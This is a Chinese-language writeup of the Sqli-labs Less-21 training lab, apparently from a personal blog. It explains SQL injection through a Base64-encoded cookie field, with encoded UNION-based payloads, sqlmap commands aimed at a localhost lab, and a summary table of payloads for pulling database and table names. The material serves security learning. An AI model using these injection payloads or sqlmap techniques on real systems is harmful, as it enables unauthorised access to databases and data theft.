---
title: Sqli-labs Less-21 Writeup
date: 2026-11-19
categories: 渗透测试
tags: [Sqli-labs, SQL注入, Web, Cookie注入, Base64编码, 联合查询]
---
## 一、 漏洞概述
- **关卡**：Less-21
- **漏洞类型**：基于 Base64 编码的 Cookie 联合查询注入（Base64 Encoded Cookie SQL Injection）
- **注入点**：HTTP 请求头中的 `Cookie`（`uname` 字段）
- **闭合方式**：单引号加括号 `')`
- **后端语句**：`SELECT * FROM users WHERE username=('$decoded_uname') LIMIT 0,1;`

## 二、 渗透测试过程

### 1. 探测注入点与编码方式
正常登录（如 `admin` / `admin`）后，使用 Burp Suite 拦截请求。观察到 Cookie 头部内容为：
`Cookie: uname=YWRtaW4%3D`
其中 `YWRtaW4%3D` 是 `admin` 的 Base64 编码（`YWRtaW4=`）经过 URL 编码后的结果。这说明后端代码在接收到 Cookie 后，先执行了 URL 解码，再进行 Base64 解码，最后拼接到 SQL 语句中。

### 2. 测试闭合方式
我们需要将注入 Payload 进行 Base64 编码后，再发送出去。
测试 payload：`admin')`
Base64 编码后：`YWRtaW4nKQ==`
修改 Cookie 发送：
```http
Cookie: uname=YWRtaW4nKQ==
```

页面返回 SQL 语法报错。由此确认后端闭合方式为 ')。

### 3. 确定字段数量

构造 payload：admin') order by 3 #
Base64 编码后：YWRtaW4nKSBvcmRlciBieSAzICM=
修改 Cookie 发送，页面正常；将 3 改为 4 测试，页面报错。确认字段数为 3。

### 4. 联合查询获取数据

使用 UNION SELECT 获取回显。注意，为了让前面的查询为空，我们需要使用一个不存在的用户名（如 -admin）。
构造 payload：-admin') union select 1,database(),3 #
Base64 编码后：LWFkbWluJykgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSwzICM=

修改 Cookie 发送：

```http
Cookie: uname=LWFkbWluJykgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSwzICM=
```

页面成功回显数据库名 security。

## 三、 自动化利用 (SQLMap)

针对 Base64 编码的 Cookie 注入，SQLMap 提供了 --tamper 脚本进行自动编码，或者直接用 -r 读取包含 Base64 编码 Payload 的请求文件（最简单）。

方法一：指定 Cookie 注入点
由于 SQLMap 无法自动识别 Base64 编码后的注入点，通常需要结合 Tamper 脚本，或者手动将 Payload 编码后在请求文件中进行测试。

```bash
# 使用 -r 指定包含注入请求的文本文件
sqlmap -r less21.txt --batch --current-db
```

方法二：使用 Tamper 脚本
如果明确知道是 Base64 编码，可以使用自带脚本（注意，该脚本会自动对 payload 进行 base64 编码）：

```bash
sqlmap -u "http://localhost/sqli-labs-master/Less-21/" --cookie="uname=admin*" --tamper=base64encode.py --batch --current-db
```

(注：使用 * 标记注入点，Tamper 脚本会将生成的 payload 转换为 Base64 编码后再发送)

## 四、 通关 Payload 汇总 (需 Base64 编码)

测试目的 明文 Payload Base64 编码后的值 (用于 Cookie)
测试闭合 admin') YWRtaW4nKQ==
判断字段数 admin') order by 3 # YWRtaW4nKSBvcmRlciBieSAzICM=
获取库名 -admin') union select 1,database(),3 # LWFkbWluJykgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSwzICM=
获取表名 -admin') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' # (需自行使用工具编码)
